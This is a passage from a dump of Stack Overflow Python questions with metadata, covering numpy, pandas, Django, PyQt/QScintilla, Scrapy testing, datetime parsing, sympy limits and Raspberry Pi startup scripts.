            return False
    return True
</code></pre>

<p>yet this O(n^3) code:</p>

<pre><code>def set_disjoint_slowest (a, b, c):
    for e1 in a:
        for e2 in b:
            for e3 in c:
                if e1 == e2 == e3:
                    return False
    return True
</code></pre>

<p>runs faster</p>

<p>see time where algorithm one is the n^3, and algorithm three is the O(n) set code... algorithm two is actually n^2 where we optimize algorithm one by checking for disjointness before the third loop starts</p>

<pre><code>Size Input (n):  10000

Algorithm One: 0.014993906021118164

Algorithm Two: 0.013481855392456055

Algorithm Three: 0.01955580711364746

Size Input (n):  100000

Algorithm One: 0.15916991233825684

Algorithm Two: 0.1279449462890625

Algorithm Three: 0.18677806854248047

Size Input (n):  1000000

Algorithm One: 1.581618070602417

Algorithm Two: 1.146049976348877

Algorithm Three: 1.8179030418395996
</code></pre>
"
39876608,5424931.0,2016-10-05 14:23:51+00:00,3,Read and Write separately in python,"<p>I'm trying to create a very simple program in python that needs to read input from the user and write output accordingly. I need an output similar to this:</p>

<pre><code>$./program.py
say something: Hello World
result: hello world
</code></pre>

<p>The thing is that i need to read input indefinitely, each time the user inputs data i would like that the printed data doesn't obstruct the input prompt. It will even better that no newlines be printed, keeping the output as above: a line for reading and another for writing.</p>

<p>I tried using curses but i don't want the hole screen to be used, just the two lines.</p>
"
39585328,682355.0,2016-09-20 03:38:37+00:00,3,Get unique intersection values of two sets,"<p>I'd like to get the indexes of unique vectors using hash (for matrices it is efficient) but np.intersect1d does not give indices, it gives values. np.in1d on the other hand does give indices but not unique ones. I zipped a dict to make it work but it doesn't seem like the most efficient. I am new to python so trying to see if there is a better way to do this. Thanks for the help!</p>

<p>code:</p>

<pre><code>import numpy as np
import hashlib
x=np.array([[1, 2, 3],[1, 2, 3], [4, 5, 6], [7, 8, 9]])
y=np.array([[4, 5, 6], [7, 8, 9],[1, 2, 3]])

xhash=[hashlib.sha1(row).digest() for row in x]
yhash=[hashlib.sha1(row).digest() for row in y]
z=np.intersect1d(xhash,yhash)

idx=list(range(len(xhash)))

d=dict(zip(xhash,idx))
unique_idx=[d[i] for i in z] #is there a better way to get this or boolean array
print(unique_idx)
uniques=np.array([x[i] for i in unique_idx])
print(uniques)
</code></pre>

<p>output:</p>

<pre><code>&gt;&gt;&gt; [2, 3, 1]
[[4 5 6]
 [7 8 9]
 [1 2 3]]
</code></pre>

<p>I'm having a similar issue for np.unique() where it doesn't give me any indexes.</p>
"
40066387,539810.0,2016-10-16 03:02:23+00:00,3,Safe to use property names inside class methods?,"<p>Given a class with a read-only property, one can modify it quite easily:</p>

<pre><code>cls.prop_name = property(cls.prop_name.fget, my_setter)
</code></pre>

<p>However, one might <code>del cls.prop_name</code> or change it as I did. This is considered acceptable by PEP 8, which states <code>prop_name</code> is a public attribute and is therefore usable by any user of the class however they like, similar to just modifying the non-public attribute I'm hiding behind the property directly and bypassing any checks I might have created, such as restricting an RGB component's value to the range 0..255.</p>

<p>This would be a bad idea according to PEP 8 if the property name began with an underscore, but it doesn't, making it OK to delete or modify the property in some way. This is the exact sort of thing that properties are meant to prevent, but by deleting or otherwise changing the property, people can override my behavior like shown above.</p>

<p>That leads me to my question: should I just use a non-public validating setter method inside the class and simply use it as the property setter, or should I use a public setter method because validation of new values for a non-public attribute isn't an intended use of properties? I'm trying to avoid code duplication, so those are really my only two options for allowing user access while also validating the value in the case of a property setter or setter method.</p>

<p>Does anybody have any experience with this sort of issue? How did you resolve it, if you did?</p>
"
39959435,6426832.0,2016-10-10 13:27:06+00:00,3,Set last non-zero element of each row to zero - NumPy,"<p>I have an array A:</p>

<pre><code>A = array([[1, 2, 3,4], [5,6,7,0] , [8,9,0,0]])
</code></pre>

<p>I want to change the last non-zero of each row to 0 </p>

<pre><code>A = array([[1, 2, 3,0], [5,6,0,0] , [8,0,0,0]])
</code></pre>

<p>how to write the code for any n*m  numpy array?
Thanks, S ;-)</p>
"
39646760,6866170.0,2016-09-22 18:48:48+00:00,3,Modules and variable scopes,"<p>I'm not an expert at python, so bear with me while I try to understand the nuances of variable scopes.</p>

<p>As a simple example that describes the problem I'm facing, say I have the following three files.</p>

<p>The first file is outside_code.py. Due to certain restrictions I cannot modify this file. It must be taken as is. It contains some code that runs an eval at some point (yes, I know that eval is the spawn of satan but that's a discussion for a later day). For example, let's say that it contains the following lines of code:</p>

<pre><code>def eval_string(x):
    return eval(x)
</code></pre>

<p>The second file is a set of user defined functions. Let's call it functions.py. It contains some unknown number of function definitions, for example, let's say that functions.py contains one function, defined below:</p>

<pre><code>def foo(x):
    print(""Your number is {}!"".format(x))
</code></pre>

<p>Now I write a third file, let's call it main.py. Which contains the following code:</p>

<pre><code>import outside_code
from functions import *
outside_code.eval_string(""foo(4)"")
</code></pre>

<p>I import all of the function definitions from functions.py with a *, so they should be accessible by main.py without needing to do something like functions.foo(). I also import outside_code.py so I can access its core functionality, the code that contains an eval. Finally I call the function in outside_code.py, passing a string that is related to a function defined in functions.py.</p>

<p>In the simplified example, I want the code to print out ""Your number is 4!"". However, I get an error stating that 'foo' is not defined. This obviously means that the code in outside_code.py cannot access the same foo function that exists in main.py. So somehow I need to make foo accessible to it. Could anyone tell me exactly what the scope of foo currently is, and how I could extend it to cover the space that I actually want to use it in? What is the best way to solve my problem?</p>
"
39658759,6801344.0,2016-09-23 10:39:43+00:00,3,Parsing JSON feed with Ruby for use in Dashing Dashboard,"<p>First post here, so ya know, be nice?</p>

<p>I'm setting up a dashboard in Dashing (<a href=""http://dashing.io/"" rel=""nofollow""><a href=""http://dashing.io/"" rel=""nofollow"">http://dashing.io/</a></a>) using a JSON feed on a server, which looks like:</p>

<pre><code>{  
   ""error"":0,
   ""message_of_the_day"":""Welcome!"",
   ""message_of_the_day_hash"":""a1234567890123456789012345678901"",
   ""metrics"":{  
      ""daily"":{  
         ""metric1"":""1m 30s"",
         ""metric2"":160
      },
      ""monthly"":{  
         ""metric1"":""10m 30s"",
         ""metric2"":""3803""
      }
   },
</code></pre>

<p>I have been experimenting with grabbing the data from the feed, and have managed to do so by Python with no issues:</p>

<pre><code>import json
import urllib2

data = {
        'region': ""Europe""
}

req = urllib2.Request('http://192.168.1.2/info/handlers/handler.php')
req.add_header('Content-Type', 'application/json')

response = urllib2.urlopen(req, json.dumps(data))

print response.read()
</code></pre>

<p>However I haven't yet been successful, and get numerous errors in Ruby.
Would anyone be able to point me in the right direction in parsing this in Ruby?
My attempts to write a basic script, (keeping it simple and outside of Dashing) don't pull through any data.</p>

<pre><code>#!/usr/bin/ruby
require 'httparty'
require 'json'

response = HTTParty.get(""http://192.168.1.2/info/handlers/handler.php?region=Europe"") 

json = JSON.parse(response.body)

puts json
</code></pre>
"
39845960,2812104.0,2016-10-04 06:55:20+00:00,3,"Sum of difference of squares between each combination of rows of 17,000 by 300 matrix","<p>Ok, so I have a matrix with 17000 rows (examples) and 300 columns (features). I want to compute basically the euclidian distance between each possible combination of rows, so the sum of the squared differences for each possible pair of rows.
Obviously it's a lot and iPython, while not completely crashing my laptop, says ""(busy)"" for a while and then I can't run anything anymore and it certain seems to have given up, even though I can move my mouse and everything.</p>

<p>Is there any way to make this work? Here's the function I wrote. I used numpy everywhere I could.
What I'm doing is storing the differences in a difference matrix for each possible combination. I'm aware that the lower diagonal part of the matrix = the upper diagonal, but that would only save 1/2 the computation time (better than nothing, but not a game changer, I think).</p>

<p><strong>EDIT</strong>: I just tried using <code>scipy.spatial.distance.pdist</code>but it's been running for a good minute now with no end in sight, is there a better way? I should also mention that I have NaN values in there...but that's not a problem for numpy apparently.</p>

<pre><code>features = np.array(dataframe)
distances = np.zeros((17000, 17000))


def sum_diff():
    for i in range(17000):
        for j in range(17000):
            diff = np.array(features[i] - features[j])
            diff = np.square(diff)
            sumsquares = np.sum(diff)
            distances[i][j] = sumsquares
</code></pre>
"
40134175,3331879.0,2016-10-19 14:24:04+00:00,3,Running program in .profile slows down GUI startx,"<p>I want to run a python program that polls the keyboard on startup/login to my raspberry pi.</p>

<p>Previous attempts included cron jobs (failed due to lack of stdin or stdout).</p>

<p><code>rc.local</code> also failed as it has no stdin (it got stuck in a perpetual loop - now <em>that</em> was fun to escape)</p>

<p>Hence I've arrived at placing my command into the .profile, and this appears to work well! The program functions exactly as intended when the Pi is turned on <em>but</em>...</p>

<p>When I then try to launch the GUI by <code>startx</code>, the screen turns black and completely fails to launch. It seems to be something to do with the Ppython program, because when I remove it from the <code>bash</code> .profile, it all functions fine.</p>

<p>Any help would be massively appreciated!</p>

<p><strong>Update</strong></p>

<p>I created a script that also output to LED's (a simple Red-Yellow-Green sequence) and it appears that .profile is execute <em>again</em> when <code>startx</code> is run? If so why?</p>

<p>Below is my .profile code, and then my python program</p>

<p><strong>.profile lines</strong></p>

<pre><code>echo ""About to run keyboard polling""; sleep 3
python /home/pi/poll_keyboard.py
</code></pre>

<p><strong>poll_keyboard.py</strong></p>

<pre><code>import thread
import time
def input_thread(L):
    key = raw_input()
    L.append(key)
    thread.exit() #Should close thread at end
def do_print():
    L = []
    thread.start_new_thread(input_thread, (L,))
    i = 0
    while True:
        print ""Hello World %d"" % i
        if L: #If anything has been detected
            break
        i += 1
        time.sleep(0.5)
    return L
key = do_print()
print ""Key press detected: %s. Exiting in 2"" % key
time.sleep(2)
exit()
</code></pre>
"
40079728,6756496.0,2016-10-17 06:24:09+00:00,3,Get models ordered by an attribute that belongs to its OneToOne model,"<p>Let's say there is one model named <code>User</code> and the other named <code>Pet</code> which has a <code>OneToOne</code> relationship with <code>User</code>, the <code>Pet</code> model has an attribute <code>age</code>, how to get the ten <code>User</code> that owns the top ten <code>oldest</code> dog?</p>

<pre><code>class User(models.Model):
     name = models.CharField(max_length=50, null=False, blank=False)

class Pet(models.Model):
     name = models.CharField(max_length=50, null=False, blank=False)
     owner = models.OneToOneField(User, on_delete=models.CASCADE)
     age = models.IntegerField(null=False)
</code></pre>

<hr>

<p>In <code>User</code>, there is an attribute <code>friends</code> that has a <code>ManyToMany</code> relationship with <code>User</code>, how to get the ten <code>friends</code> of <code>User Tom</code> that owns the top ten <code>oldest</code> dog?</p>

<pre><code>class User(models.Model):
     name = models.CharField(max_length=50, null=False, blank=False)
     friends = models.ManyToManyField(self, ...)

class Pet(models.Model):
     name = models.CharField(max_length=50, null=False, blank=False)
     owner = models.OneToOneField(User, on_delete=models.CASCADE)
     age = models.IntegerField(null=False)
</code></pre>
"
40096621,5275692.0,2016-10-17 22:23:09+00:00,3,How do I send a DHCP request to find DHCP server IP address? Is this possible?,"<p>Is it possible to write a small script that will send out a DHCP broadcast request and find the DHCP server address?</p>

<p>I need this for a project, but my research led me to believe that you cannot do this on Windows? I would need a small script for OSX, Linux and Windows. </p>
"
39657924,3809375.0,2016-09-23 09:57:43+00:00,2,How to show dialogs at a certain position inside a QScintilla widget?,"<p>I got this simple piece of mcve code:</p>

<pre><code>import sys
import re

from PyQt5 import QtGui, QtWidgets, QtCore
from PyQt5.Qsci import QsciScintilla
from PyQt5 import Qsci


class SimpleEditor(QsciScintilla):

    def __init__(self, language=None, parent=None):
        super().__init__(parent)

        font = QtGui.QFont()
        font.setFamily('Courier')
        font.setFixedPitch(True)
        font.setPointSize(10)
        self.setFont(font)
        self.setMarginsFont(font)
        fontmetrics = QtGui.QFontMetrics(font)
        self.setMarginsFont(font)
        self.setMarginWidth(0, fontmetrics.width(""00000"") + 6)
        self.setMarginLineNumbers(0, True)
        self.setMarginsBackgroundColor(QtGui.QColor(""#cccccc""))
        self.setBraceMatching(QsciScintilla.SloppyBraceMatch)
        self.setCaretLineVisible(True)
        self.setCaretLineBackgroundColor(QtGui.QColor(""#E8E8FF""))

        if language:
            self.lexer = getattr(Qsci, 'QsciLexer' + language)()
            self.setLexer(self.lexer)

        self.SendScintilla(QsciScintilla.SCI_FOLDALL, True)
        self.setAutoCompletionThreshold(1)
        self.setAutoCompletionSource(QsciScintilla.AcsAPIs)
        self.setFolding(QsciScintilla.BoxedTreeFoldStyle)

        # Signals/Slots
        self.cursorPositionChanged.connect(self.on_cursor_position_changed)
        self.copyAvailable.connect(self.on_copy_available)
        self.indicatorClicked.connect(self.on_indicator_clicked)
        self.indicatorReleased.connect(self.on_indicator_released)
        self.linesChanged.connect(self.on_lines_changed)
        self.marginClicked.connect(self.on_margin_clicked)
        self.modificationAttempted.connect(self.on_modification_attempted)
        self.modificationChanged.connect(self.on_modification_changed)
        self.selectionChanged.connect(self.on_selection_changed)
        self.textChanged.connect(self.on_text_changed)
        self.userListActivated.connect(self.on_user_list_activated)

    def on_cursor_position_changed(self, line, index):
        print(""on_cursor_position_changed"")

    def on_copy_available(self, yes):
        print('-' * 80)
        print(""on_copy_available"")

    def on_indicator_clicked(self, line, index, state):
        print(""on_indicator_clicked"")

    def on_indicator_released(self, line, index, state):
        print(""on_indicator_released"")

    def on_lines_changed(self):
        print(""on_lines_changed"")

    def on_margin_clicked(self, margin, line, state):
        print(""on_margin_clicked"")

    def on_modification_attempted(self):
        print(""on_modification_attempted"")

    def on_modification_changed(self):
        print(""on_modification_changed"")

    def on_selection_changed(self):
        print(""on_selection_changed"")

    def on_text_changed(self):
        print(""on_text_changed"")

    def on_user_list_activated(self, id, text):
        print(""on_user_list_activated"")


if __name__ == ""__main__"":
    app = QtWidgets.QApplication(sys.argv)

    ex = QtWidgets.QWidget()
    hlayout = QtWidgets.QHBoxLayout()
    ed = SimpleEditor(""JavaScript"")

    hlayout.addWidget(ed)

    ed.setText(""""""#ifdef GL_ES
precision mediump float;
#endif

#extension GL_OES_standard_derivatives : enable

uniform float time;
uniform vec2 mouse;
uniform vec2 resolution;

void main( void ) {

    vec2 st = ( gl_FragCoord.xy / resolution.xy );
    vec2 lefbot = step(vec2(0.1), st);
    float pct = lefbot.x*lefbot.y;
    vec2 rigtop = step(vec2(0.1), 1.-st);
    pct *= rigtop.x*rigtop.y;
    vec3 color = vec3(pct);

    gl_FragColor = vec4( color, 1.0 );"""""")

    ex.setLayout(hlayout)
    ex.show()
    ex.resize(800, 600)

    sys.exit(app.exec_())
</code></pre>

<p>I'm trying to code a similar solution to the one provided on this <a href=""https://www.khanacademy.org/computer-programming/tree-generator/822944839"" rel=""nofollow"">site</a>. As you can see, on that site the user can tweak numeric values only by clicking over, when they do so a little dialog will appear and the user will be able to change values in realtime. </p>

<p>Now, the first thing I need to figure out is which are the signals I need to consider when the user click on the QScintilla widget (I'm using these <a href=""http://pyqt.sourceforge.net/Docs/QScintilla2/classQsciScintilla.html"" rel=""nofollow"">docs</a>). Which is/are the one/s I should really care about it.</p>

<p>In any case, assuming I use the right signal to popup my dialog containing some sliders, how could i figure out the right position where my dialog should appear?</p>
"
39739432,3782963.0,2016-09-28 06:21:28+00:00,2,Get minimum number column wise in a multidimensional Pandas DataFrame - Python,"<p>I am new to Pandas. I am trying to get the minimum number column-wise. So these are the steps I have followed:</p>

<ol>
<li><p>I read the files from CSV files using </p>

<p>data = [pd.read_csv(f, index_col=None, header=None) for f in temp]</p></li>
<li><p>Then added it to another data frame <code>flow = pd.DataFrame(data)</code>, making it ""3d"" data-frame.</p></li>
</ol>

<p>So, <code>data</code> has <code>[128 rows x 14 columns] * 60 samples</code> with out <code>index_col</code> and <code>header</code></p>

<p>One of the samples is:</p>

<pre><code>[          0       1       2       3       4       5       6       7       8       9       10      11      12      13
0    3985.1  4393.3  4439.5  3662.1  5061.0  3990.8  4573.8  4036.9  4717.9  4225.6  4638.5  4157.9  4496.4  4007.7
1    3998.5  4398.5  4447.2  3660.0  5062.6  3986.7  4573.3  4045.1  4733.8  4238.5  4650.3  4167.2  4509.2  4022.6
2    3995.4  4397.9  4442.1  3659.5  5058.5  3987.2  4569.7  4039.5  4724.1  4234.9  4645.6  4161.5  4506.2  4014.9
3    3985.1  4396.9  4432.3  3660.0  5054.9  3988.2  4568.2  4037.9  4719.0  4230.3  4632.3  4150.8  4500.5  4004.1
4    3985.1  4391.3  4428.2  3661.5  5057.9  3987.2  4570.8  4044.6  4731.3  4236.9  4631.8  4151.8  4503.1  4005.6
5    3991.3  4391.8  4430.8  3662.6  5059.5  3987.7  4572.8  4044.6  4730.8  4237.4  4639.5  4157.4  4507.2  4009.7
6    3989.7  4396.9  4436.9  3661.5  5057.4  3987.7  4571.3  4035.4  4716.9  4230.3  4641.0  4156.9  4505.1  4010.8
7    3983.6  4392.8  4435.4  3660.0  5056.9  3987.2  4570.8  4032.8  4719.5  4227.7  4634.4  4153.8  4497.4  4008.2
8    3983.1  4388.7  4428.7  3661.5  5056.9  3987.7  4571.8  4041.0  4728.2  4231.8  4631.3  4154.4  4499.0  4004.6
9    3988.2  4395.9  4433.3  3662.1  5057.9  3987.7  4572.3  4040.5  4720.5  4231.3  4636.9  4154.9  4503.1  4005.1
10   3988.7  4398.5  4439.0  3660.0  5060.0  3986.7  4572.3  4032.3  4710.3  4225.1  4640.5  4154.9  4497.4  4008.2
11   3983.6  4391.3  4434.4  3661.0  5059.0  3988.7  4570.3  4041.0  4724.6  4235.4  4642.6  4163.1  4499.5  4010.8
12   3984.1  4388.7  4432.8  3664.1  5058.5  3991.8  4574.4  4051.8  4740.5  4245.1  4645.1  4170.8  4507.7  4014.4
13   3986.7  4390.8  4432.8  3664.1  5057.9  3991.3  4583.1  4043.1  4724.6  4231.8  4642.1  4161.5  4505.6  4012.8
14   3984.6  4395.4  4433.8  3661.5  5059.0  3991.3  4583.1  4036.9  4713.8  4222.1  4641.0  4157.4  4503.1  4010.8
15   3989.2  4400.5  4440.0  3661.0  5066.7  3994.4  4579.5  4045.1  4732.8  4233.8  4648.2  4170.3  4509.2  4016.4
16   3990.8  4394.4  4437.4  3661.5  5071.8  3996.4  4580.5  4045.1  4738.5  4239.5  4650.3  4171.3  4509.7  4016.4
17   3979.0  4383.6  4426.7  3660.0  5065.6  3995.4  4577.4  4034.4  4715.4  4228.2  4643.6  4158.5  4504.6  4005.1
18   3972.8  4383.1  4426.2  3660.0  5057.9  3991.8  4569.7  4034.4  4712.3  4228.2  4639.5  4157.9  4502.6  3999.0
19   3982.6  4386.7  4430.3  3661.5  5055.9  3987.2  4568.7  4045.6  4737.4  4243.1  4641.0  4166.7  4504.1  4007.7
20   3990.3  4389.7  4432.3  3661.5  5059.5  3989.7  4571.8  4047.2  4740.5  4245.1  4647.2  4169.2  4506.2  4014.9
21   3989.2  4392.8  4435.4  3661.0  5066.7  3996.9  4573.8  4035.9  4713.8  4232.3  4650.3  4166.7  4505.6  4014.4
22   3989.7  4391.8  4435.4  3661.5  5069.7  3997.4  4571.8  4035.4  4711.8  4231.3  4647.2  4167.7  4507.7  4017.4
23   3990.8  4389.7  4432.8  3660.0  5069.2  3996.9  4569.2  4044.6  4734.9  4237.9  4646.2  4168.7  4509.7  4020.0
24   3988.7  4393.3  4434.9  3659.0  5070.3  4000.5  4570.8  4041.0  4725.6  4232.8  4648.2  4166.7  4504.6  4016.4
25   3990.3  4397.9  4440.0  3661.0  5065.6  3997.9  4571.8  4039.0  4713.8  4230.8  4650.3  4169.7  4506.7  4019.0
26   3990.8  4396.4  4437.4  3662.1  5057.9  3988.7  4572.3  4045.1  4729.2  4236.4  4648.2  4169.7  4509.2  4022.6
27   3984.6  4385.1  4425.6  3661.5  5056.4  3990.8  4577.4  4041.5  4727.2  4231.8  4641.5  4158.5  4495.4  4010.3
28   3983.6  4381.0  4424.6  3662.1  5057.4  3999.5  4585.1  4037.4  4716.9  4229.7  4641.5  4157.4  4491.8  4006.2
29   3991.8  4391.3  4434.9  3662.1  5056.9  4000.0  4588.7  4040.5  4723.1  4234.4  4647.7  4167.7  4503.1  4017.4
..      ...     ...     ...     ...     ...     ...     ...     ...     ...     ...     ...     ...     ...     ...
98   3988.2  4372.3  4424.1  3662.1  5040.5  3989.2  4585.6  4033.3  4719.0  4233.3  4647.2  4163.6  4502.1  4011.8
99   3993.8  4382.1  4429.2  3660.5  5042.1  3988.2  4590.3  4045.1  4737.4  4255.9  4659.0  4176.9  4514.4  4021.5
100  3992.8  4384.1  4430.3  3661.0  5041.0  3989.7  4601.5  4039.5  4733.3  4264.1  4663.1  4186.2  4512.3  4023.6
101  3988.2  4374.9  4424.6  3663.6  5040.0  3991.3  4601.0  4028.7  4719.0  4247.7  4654.9  4171.8  4505.1  4017.4
102  3989.7  4374.9  4427.2  3662.1  5040.5  3990.8  4590.3  4033.3  4716.9  4234.4  4654.4  4168.7  4508.7  4015.9
103  3987.2  4372.3  4428.7  3660.5  5036.4  3988.2  4585.1  4035.9  4719.5  4231.8  4651.3  4171.3  4504.6  4012.8
104  3979.5  4365.6  4421.5  3662.1  5030.3  3984.1  4586.2  4030.3  4717.4  4229.7  4641.0  4158.5  4491.8  4005.6
105  3982.1  4372.8  4420.5  3662.1  5032.3  3974.9  4586.2  4034.4  4719.0  4233.8  4640.0  4155.4  4495.4  4006.2
106  3987.7  4380.0  4427.7  3659.5  5037.9  3973.8  4584.1  4039.0  4720.5  4241.0  4644.1  4165.1  4509.2  4010.8
107  3987.2  4374.4  4428.7  3662.6  5039.5  3982.6  4585.1  4034.4  4719.0  4233.3  4641.5  4158.5  4506.7  4007.7
108  3982.6  4370.8  4420.0  3664.1  5036.9  3982.6  4587.7  4034.9  4724.1  4228.7  4639.0  4150.8  4495.4  4000.5
109  3979.0  4372.3  4414.4  3658.5  5029.2  3971.8  4580.0  4037.4  4723.6  4233.8  4639.5  4154.9  4492.8  3997.4
110  3979.0  4374.4  4418.5  3658.5  5027.7  3970.3  4571.3  4029.7  4712.3  4225.6  4640.0  4155.4  4496.9  3998.5
111  3986.2  4381.0  4428.2  3663.1  5037.4  3980.5  4580.0  4025.6  4705.1  4217.9  4643.6  4157.9  4504.1  4003.1
112  3991.3  4383.6  4430.3  3661.5  5042.6  3985.6  4585.6  4027.2  4708.7  4225.6  4644.6  4166.7  4508.2  4007.2
113  3983.6  4378.5  4432.8  3659.0  5034.4  3976.9  4573.8  4032.8  4725.6  4236.9  4643.6  4165.6  4504.1  4005.1
114  3976.4  4380.0  4443.6  3661.0  5028.2  3968.7  4572.8  4037.4  4735.4  4247.2  4649.7  4168.2  4507.7  4008.2
115  3973.8  4378.5  4441.5  3661.5  5033.3  3974.4  4585.6  4028.2  4713.3  4236.9  4650.8  4170.8  4508.2  4004.1
116  3971.8  4370.3  4431.8  3661.0  5036.4  3983.6  4588.7  4019.0  4696.4  4212.3  4639.0  4159.0  4496.9  3991.8
117  3972.3  4371.8  4437.4  3661.0  5031.3  3982.1  4585.1  4032.3  4720.5  4218.5  4637.4  4155.9  4496.9  3994.9
118  3973.8  4379.0  4444.1  3660.5  5032.3  3980.0  4587.2  4041.0  4730.8  4236.9  4646.7  4166.7  4506.2  4006.7
119  3982.1  4385.1  4447.2  3661.5  5040.5  3984.1  4586.7  4024.6  4708.2  4230.3  4648.2  4168.7  4506.7  4010.3
120  3991.3  4390.8  4452.8  3663.1  5043.1  3985.1  4576.4  4019.0  4710.8  4228.2  4650.3  4168.7  4505.6  4011.8
121  3989.2  4386.7  4451.3  3660.5  5041.0  3981.5  4568.2  4032.3  4733.3  4237.9  4657.4  4172.8  4508.2  4011.3
122  3983.6  4384.1  4448.7  3658.5  5040.0  3982.6  4574.4  4036.9  4730.8  4237.4  4656.4  4172.3  4505.6  4008.7
123  3987.7  4391.3  4455.4  3661.0  5038.5  3984.6  4585.6  4029.7  4716.4  4231.3  4655.4  4171.3  4504.1  4012.8
124  3990.8  4392.8  4460.0  3660.0  5038.5  3983.6  4583.1  4026.2  4714.4  4231.3  4656.9  4172.3  4506.2  4013.8
125  3988.7  4390.8  4456.4  3657.9  5040.0  3984.6  4576.4  4025.1  4715.9  4231.3  4651.8  4167.2  4505.1  4012.8
126  3990.3  4393.8  4455.9  3659.0  5040.0  3983.1  4577.4  4026.7  4720.5  4231.8  4647.2  4167.2  4505.6  4018.5
127  3988.2  4392.8  4453.3  3660.0  5040.5  3976.9  4581.5  4033.8  4732.8  4235.4  4649.2  4170.8  4506.2  4015.9

[128 rows x 14 columns]]
</code></pre>

<p>I am trying to get the minimum number column-wise for every sample. How should I do it?</p>

<p>I tried using <code>min()</code>, by doing <code>data[0][0].min()</code> but I get the following as the output:</p>

<pre><code>[[ 3985.1  4393.3  4439.5 ...,  4157.9  4496.4  4007.7]
 [ 3998.5  4398.5  4447.2 ...,  4167.2  4509.2  4022.6]
 [ 3995.4  4397.9  4442.1 ...,  4161.5  4506.2  4014.9]
 ..., 
 [ 3988.7  4390.8  4456.4 ...,  4167.2  4505.1  4012.8]
 [ 3990.3  4393.8  4455.9 ...,  4167.2  4505.6  4018.5]
 [ 3988.2  4392.8  4453.3 ...,  4170.8  4506.2  4015.9]]
</code></pre>

<p>It's same as the sample. I don't know what's the problem here.</p>
"
39733655,6890112.0,2016-09-27 20:22:46+00:00,2,Scrapy: effective way to test inline requests,"<p>I wrote a spider using scrapy-inline-requests library. So the parse method in my spider looks something like this:</p>

<pre><code>@inline_requests
def parse(self, response1):
    item = MyItem()
    loader = ItemLoader(item=item, response=response1)

    #extracting some data from the response1

    try:
        response 2 = yield Request(some_url)
        #extracting some other data from response2
    except Exception:
            self.logger.warning(""Failed request to: %s"", some_url)

    yield loader.load_item()
</code></pre>

<p>I want to effectively test this method. I can easily write a test, in which a create a fake mock response1 and pass it to the function. However, I've got no idea how to mock response2 and get the complete item with the data from both the fake responses. Do you have any suggestions?</p>
"
40090619,3957154.0,2016-10-17 15:46:15+00:00,2,pandas: merge conditional on time range,"<p>I'd like to merge one data frame with another, where the merge is conditional on the date/time falling in a particular range. </p>

<p>For example, let's say I have the following two data frames.</p>

<pre><code>import pandas as pd
import datetime

# Create main data frame.
data = pd.DataFrame()
time_seq1 = pd.DataFrame(pd.date_range('1/1/2016', periods=3, freq='H'))
time_seq2 = pd.DataFrame(pd.date_range('1/2/2016', periods=3, freq='H'))
data = data.append(time_seq1, ignore_index=True)
data = data.append(time_seq1, ignore_index=True)
data = data.append(time_seq1, ignore_index=True)
data = data.append(time_seq2, ignore_index=True)
data['myID'] = ['001','001','001','002','002','002','003','003','003','004','004','004']
data.columns = ['Timestamp', 'myID']

# Create second data frame.
data2 = pd.DataFrame()
data2['time'] = [pd.to_datetime('1/1/2016 12:06 AM'), pd.to_datetime('1/1/2016 1:34 AM'), pd.to_datetime('1/2/2016 12:25 AM')]
data2['myID'] = ['002', '003', '004']
data2['specialID'] = ['foo_0', 'foo_1', 'foo_2']

# Show data frames.
data
             Timestamp myID
0  2016-01-01 00:00:00  001
1  2016-01-01 01:00:00  001
2  2016-01-01 02:00:00  001
3  2016-01-01 00:00:00  002
4  2016-01-01 01:00:00  002
5  2016-01-01 02:00:00  002
6  2016-01-01 00:00:00  003
7  2016-01-01 01:00:00  003
8  2016-01-01 02:00:00  003
9  2016-01-02 00:00:00  004
10 2016-01-02 01:00:00  004
11 2016-01-02 02:00:00  004

data2
                 time myID specialID
0 2016-01-01 00:06:00  002     foo_0
1 2016-01-01 01:34:00  003     foo_1
2 2016-01-02 00:25:00  004     foo_2
</code></pre>

<p>I would like to construct the following output. </p>

<pre><code># Desired output.
             Timestamp myID special_ID
0  2016-01-01 00:00:00  001        NaN
1  2016-01-01 01:00:00  001        NaN
2  2016-01-01 02:00:00  001        NaN
3  2016-01-01 00:00:00  002        NaN
4  2016-01-01 01:00:00  002      foo_0
5  2016-01-01 02:00:00  002        NaN
6  2016-01-01 00:00:00  003        NaN
7  2016-01-01 01:00:00  003        NaN
8  2016-01-01 02:00:00  003      foo_1
9  2016-01-02 00:00:00  004        NaN
10 2016-01-02 01:00:00  004      foo_2
11 2016-01-02 02:00:00  004        NaN
</code></pre>

<p>In particular, I want to merge <code>special_ID</code> into <code>data</code> such that <code>Timestamp</code> is the first time occurring after the value of <code>time</code>. For example, <code>foo_0</code> would be in the row corresponding to <code>2016-01-01 01:00:00</code> with <code>myID = 002</code> since that is the next time in <code>data</code> immediately following <code>2016-01-01 00:06:00</code> (the <code>time</code> of <code>special_ID = foo_0</code>) among the rows containing <code>myID = 002</code>. </p>

<p>Note, <code>Timestamp</code> is not the index of <code>data</code> and <code>time</code> is not the index of <code>data2</code>. Most other related posts seem to rely on using the datetime object as the index of the data frame.</p>
"
40086365,6248485.0,2016-10-17 12:26:13+00:00,2,datetime format does not match with content,"<p>I have checked quite a lot of questions related to this topic but I'm not able to find my error. </p>

<p>My code can be simplified to:</p>

<pre><code>date = ""2016/07/20""
time = ""11:44:20.920""

date_time = datetime.strptime(date + "" "" + time, '%y/%m/%d %H:%M:%S.%f')
</code></pre>

<p>The error I get is the following:</p>

<pre><code>Traceback (most recent call last):
  File ""adma_shortener.py"", line 50, in &lt;module&gt;
    adma_time[ii] = datetime.strptime(a, '%y/%m/%d %H:%M:%S.%f').replace(microsecond=0)
  File ""/usr/lib/python2.7/_strptime.py"", line 325, in _strptime
    (data_string, format))
ValueError: time data '2016/07/20 11:44:20.920' does not match format '%y/%m/%d %H:%M:%S.%f'
</code></pre>

<p>Can someone see my error? 
Thanks in advance</p>
"
39736887,6845969.0,2016-09-28 02:01:57+00:00,2,Use Python to calculate P**n while n approach +oo and P is a matrix,"<p>The code is </p>

<pre><code>import sympy as sm
import numpy as np

k=sm.Symbol('k')
p=np.matrix([[1./2,1./4,1./4],[1./2,0,1./2],[1./4,0,3./4]])
sm.limit(p**k,k,sm.oo)
</code></pre>

<p>It indicates 'TypeError: exponent must be an integer'. But if I change the matrix to a constant like this
    <code>sm.limit(2**k,k,sm.oo)</code>
, it could print the correct answer. So how can I deal with this problem? Thanks for your help!</p>
"
40088930,7031490.0,2016-10-17 14:22:35+00:00,2,Code that makes cyclic reference for x spaces in list,"<p>I have a tasko to make a program in which i get m, n and k. I should create a list a with <code>n*m</code> element.
